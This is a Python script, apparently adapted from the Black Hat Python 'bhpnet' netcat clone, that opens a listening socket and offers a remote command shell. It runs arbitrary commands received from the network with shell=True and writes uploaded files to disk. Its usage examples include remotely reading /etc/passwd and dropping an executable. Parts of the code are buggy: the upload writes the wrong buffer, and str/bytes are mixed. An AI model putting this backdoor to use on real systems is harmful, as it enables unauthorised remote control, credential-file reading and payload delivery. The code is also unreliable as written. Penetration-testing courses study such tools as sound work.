#!/usr/bin/python3.8

import argparse
import textwrap
import sys
import subprocess
import socket
import threading

def client_sender(target_address, target_port, data_to_send):

	client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		# Connect to target host.
		client_socket.connect((target_address, target_port))

		if data_to_send:
			client_socket.send(data_to_send.encode(encoding = "UTF-8"))

		# Here, we continously receive and send off data to the remote target until the user kills the script.
		while True:
			response = ""
			while True:
				received_data = client_socket.recv(1024).decode(encoding = "UTF-8")
				received_data_length = len(received_data)
				response += received_data

				if received_data_length < 1024:
					break

			print(response, end = "")
			# Wait for more input
			data_to_send = input("") + "\n"

			client_socket.send(data_to_send.encode(encoding = "UTF-8"))

	except:
		print("[*] Exception! Exiting.")

	finally:
		# Close the connection.
		client_socket.close()

def server_loop(target, port, upload, execute, command):

	server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server_socket.bind((target, port))

	server_socket.listen(5)

	while True:
		(client_socket, address) = server_socket.accept()

		client_thread = threading.Thread(target = client_handler, args = (client_socket, upload, execute, command))
		client_thread.start()

def run_command(command):

	command = command.rstrip() 	# The Newline character and the whitespace character
					# are stripped from the end of the string.

	# The given command is run in a subprocess to easily get
	# the stdout and the stderr.
	try:
		# This will launch  a new process. Note : cd commands are useless.
		output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = True)
		# Here, the stdout and the stderr are merged together by "stderr = subprocess.STDOUT".
		# Moreover, the command will be a string. That's why, the keyword argument "shell" must be set on True.

	except:
		output = "Failed to execute the command.\r\n"

	return output

def client_handler(client_socket, upload, execute, command):

	# Read all of the received bytes and write them in a file located in the given destination.
	if upload:
		file_buffer = ""

		# Keep reading data until none is available
		while True:
			received_data = client_socket.recv(1024).decode(encoding = "UTF-8")
			received_data_length = len(received_data)
			file_buffer += received_data

			if received_data_length < 1024:
				break

		# The received bytes are now written to a file.
		try:
			file_descriptor = open(upload, "wb") # The "wb" flag ensures that we are uploading
							     # and writing a binary executable with success.
			file_descriptor.write(received_data)
			file_descriptor.close()

			# Acknowledge that we wrote the file out.
			client_socket.send(b"Successfully saved file to %s\r\n" % upload)

		except:
			client_socket.send(b"Failed to save file to %s\r\n" % upload)
	# Execute in a Unix shell a single line command.
	if execute:
		output = run_command(execute)
		client_socket.send(output.encode(encoding = "UTF-8"))

	# In case of a command shell was requested.
	if command:
		while True:
			# Show a simple prompt.
			client_socket.send(b"<BHP:#> ")

			received_command = ""
			# Will receive until a linefeed (enter key) is given. This makes the program netcat-friendly.
			while "\n" not in received_command:
				received_command += client_socket.recv(1024).decode(encoding = "UTF-8")

			# Send back the command output.
			response = run_command(received_command)
			client_socket.send(response)

parser = argparse.ArgumentParser(formatter_class = argparse.RawDescriptionHelpFormatter, epilog =textwrap.dedent(\
					"""
					Examples:
					bhpnet.py -t 192.168.0.1 5555 -l -c
					bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe
					bhpnet.py -t 192.168.0.1 -p 5555 -l -e = "cat /etc/passwd"
					echo "ABCDEFGHI" | ./bhpnet.py -t 192.168.11.12 -p 135
					"""))
parser.add_argument("-t", "--target", default = "0.0.0.0", help ="The target IPv4 address.")
parser.add_argument("-p", "--port", type = int, help = "The target port.")
parser.add_argument("-l", "--listen", action = "store_true", default = False,\
			help = "Listen on [host]:[port] for incoming connections.")
parser.add_argument("-e", "--execute", help = "--execute=file_to_run execute the given file upon receiving a connection.")
parser.add_argument("-c", "--command", action = "store_true", default = False,\
			help = "Initialize a command shell.")
parser.add_argument("-u", "--upload", help = "--upload=destination upon receiving connection, upload a file and write to [destination]")

args = parser.parse_args()

# Verify the correctness of the port number.
if args.port == 0:
	parser.error("For TCP, the port number 0 is reserved and cannot be used.")
elif args.port < 1 or args.port > 65535:
	parser.error("For TCP, the usable port numbers range from 1 to 65535.")

# Send off data from the standard input.
if not args.listen and args.target != "0.0.0.0":
	"""
	The file object stdin enables to read multiple command lines at once.
	In order to quit, the "CTRL-D" button must be pressed.
	"""
	print("Read data from stdin")
	data_to_send = sys.stdin.read()

	# Send data off.
	client_sender(args.target, args.port, data_to_send)

# Listen to connections and will potentially upload things,
# execute commands and drop a shell back depending on our command
# line options.
elif args.listen:
	server_loop(args.target, args.port, args.upload, args.execute, args.command)


